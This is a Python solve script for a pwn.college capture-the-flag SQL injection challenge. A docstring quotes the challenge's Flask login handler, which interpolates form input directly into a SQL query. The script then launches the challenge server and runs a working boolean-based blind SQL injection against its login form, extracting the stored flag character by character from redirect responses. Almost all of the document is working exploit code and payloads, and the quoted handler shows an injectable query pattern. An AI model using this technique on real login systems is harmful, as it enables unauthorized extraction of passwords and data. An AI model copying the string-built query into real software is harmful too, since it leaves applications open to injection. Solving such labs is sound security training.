import os
import re
import requests
import string


"""
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            return f"Hello, {username}!\n"

    return form(["username", "password"])
"""


flag = ""
max_dec_ascii = 127
pat0 = re.compile(r".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

os.close(w_pipe1)

output = os.fdopen(r_pipe1, "r")

while True:
	line = output.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80"
		data = {"username": 'flag', "password": '" OR (SELECT hex(substr(password,1,12)) FROM users WHERE username = "flag") = hex("pwn.college{") --' }
		r = requests.post(url, data=data, allow_redirects=False)
		if r.status_code == 302:
			flag = "pwn.college{"
		i = 13
		while True:
			for char in list(string.ascii_letters) + list(string.digits) + ["{", "}", "-", "_", "."]:
				data = {"username": 'flag', "password": f'" OR (SELECT hex(substr(password,{i},1)) FROM users WHERE username = "flag") = hex("{char}") --' }
				print(f"Trying {data}")
				r = requests.post(url, data=data, allow_redirects=False)
				if r.status_code == 302:
					flag += char
					break
			print(flag)
			if flag[-1] == "}":
				break
			i += 1

		break
